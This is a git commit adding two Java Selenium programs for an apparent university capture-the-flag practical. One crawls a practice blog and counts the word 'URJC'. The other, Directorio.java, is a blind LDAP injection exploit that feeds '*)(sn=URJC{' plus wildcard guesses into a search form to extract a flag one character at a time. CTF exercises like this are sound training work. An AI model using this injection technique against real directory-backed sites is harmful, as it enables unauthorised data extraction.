725cc12cde2ac01d1c6b1bb4a492ffa06af832c2
jrhjavier <jrhjavier2@gmail.com>
2023-05-05 11:21:32 +0200

    Practica3 directory created

---
+++ Practica3_CTF/Blog.java
@@ -0,0 +1,96 @@
+package es.urjc.etsii.metodologias.selenium;
+
+import org.openqa.selenium.By;
+import org.openqa.selenium.WebDriver;
+import org.openqa.selenium.WebElement;
+import org.openqa.selenium.chrome.ChromeDriver;
+
+import java.util.*;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
+
+
+public class Blog {
+    public static void main(String[] args) throws InterruptedException {
+        var driver = createWebDriver();
+
+        try{
+            // Cola de URLs no repetidas
+            Queue<String> uniqueURLs = new LinkedList<>();
+            // Lista de URLs visitadas
+            List<String> visited = new ArrayList<>();
+            // Contador de URJC
+            int counter = 0;
+            uniqueURLs.add("https://r2-ctf-vulnerable.numa.host/");
+
+            while (!uniqueURLs.isEmpty()){
+                counter += URJCsearch(uniqueURLs, visited, driver);
+                visited.add(uniqueURLs.poll());
+            }
+
+            System.out.println(counter);
+
+        } catch (Exception e){
+            System.out.println("Se produjo una excepción: " + e.getMessage());
+        }
+
+        driver.quit();
+    }
+
+
+    public static WebDriver createWebDriver(){
+        // Podemos utilizar tambien Chrome o otros navegadores sin problema
+        // Recordad descargar el Driver apropiado para vuestro navegador
+        // Para firefox: https://github.com/mozilla/geckodriver/releases
+        // Para chrome: Buscar en chrome drivers chrome e instalar según version chrome
+
+        // Poned el path al driver aqui
+        System.setProperty("webdriver.chrome.driver","src/main/resources/chromedriver.exe");
+
+        // Configuramos el driver en caso de ser necesario, por ahora lo dejamos tal cual
+        return new ChromeDriver();
+    }
+
+
+    public static int URJCsearch(Queue<String> cola, List<String> visited, WebDriver driver){
+        int counter = 0;
+        // Se coge la primera URL de la cola
+        driver.get(cola.peek());
+
+        // Se buscan los posibles links que haya en esa página
+        List<WebElement> links = driver.findElements(By.xpath("//h2[contains(@class,'card-title')]/a"));
+
+        for (WebElement link : links) {
+            if (link != null) {
+                String linkURL = link.getAttribute("href");
+                String actualURL = driver.getCurrentUrl();
+
+                // Se añaden los links a la cola si cumplen con las condiciones:
+                if (linkURL.startsWith("https://r2-ctf-vulnerable.numa.host/") && !visited.contains(linkURL)
+                        && !cola.contains(linkURL) && !linkURL.equals(actualURL)) {
+                    cola.add(linkURL);
+                }
+            }
+        }
+
+        // Se coge el texto de la página
+        String textURL = driver.findElement(By.tagName("body")).getText();
+        // Se busca URJC en el texto
+        counter += URJCfind(textURL);
+
+        return counter;
+    }
+
+    public static int URJCfind(String text){
+        int counter = 0;
+        // Regex para encontrar la expresión "URJC"
+        Pattern urjc = Pattern.compile("\\bURJC\\b");
+        Matcher m = urjc.matcher(text);
+        // Se busca en el texto
+        while(m.find()){
+            counter++;
+        }
+
+        return counter;
+    }
+}
---
+++ Practica3_CTF/Directorio.java
@@ -0,0 +1,67 @@
+package es.urjc.etsii.metodologias.selenium;
+
+import org.openqa.selenium.By;
+import org.openqa.selenium.WebDriver;
+import org.openqa.selenium.WebElement;
+import org.openqa.selenium.chrome.ChromeDriver;
+
+import java.util.ArrayList;
+import java.util.List;
+
+public class Directorio {
+    public static void main(String[] args) throws InterruptedException {
+        var driver = createWebDriver();
+        // Visitamos la URL en el navegador
+        driver.get("https://r3-ctf-vulnerable.numa.host/");
+
+        // Sabemos que el inicio de la flag es ""URJC{""
+        String flag = "*)(sn=URJC{";
+        boolean finalFlag = false;
+
+        while (!finalFlag){
+            // Suponemos que la flag contendra caracteres ascii del 122-42 ya que con el '*' saldra correcto
+            int codigoAscii = 122;
+            boolean found = false;
+            while (codigoAscii > 41 && !found){
+                List<WebElement> lista = new ArrayList<>();
+                String tryFlag = flag + (char)codigoAscii + '*';
+                WebElement searchBox = driver.findElement(By.id("name"));
+                searchBox.clear();
+                searchBox.sendKeys(tryFlag);
+                searchBox.submit();
+
+                // Si devuelve un resultado, es el siguiente caracter de la flag
+                try {
+                    WebElement user = driver.findElement(By.className("user"));
+                    lista.add(user);
+                    if (!lista.isEmpty()){
+                        found = true;
+                        flag += (char)codigoAscii;
+                        // Si lo recorremos todo y encontramos '*' es que hemos terminado
+                        if (codigoAscii == 42){
+                            finalFlag = true;
+                        }
+                    }
+                } catch (Exception e) {
+                    // Elemento no encontrado, no hacemos nada
+                }
+                // Sino probamos otro caracter
+                codigoAscii--;
+
+            }
+        }
+        // Cerramos el driver
+        driver.quit();
+
+        // Imprimimos la flag final correcta
+        flag = flag.substring(6, flag.length() - 1);  // quitamos el inicio y el ultimo caracter (*)
+        flag += '}';  // ponemos '}' al final
+        System.out.println(flag);
+    }
+
+    public static WebDriver createWebDriver(){
+        // Path al driver
+        System.setProperty("webdriver.chrome.driver","src/main/resources/chromedriver.exe");
+        return new ChromeDriver();
+    }
+}
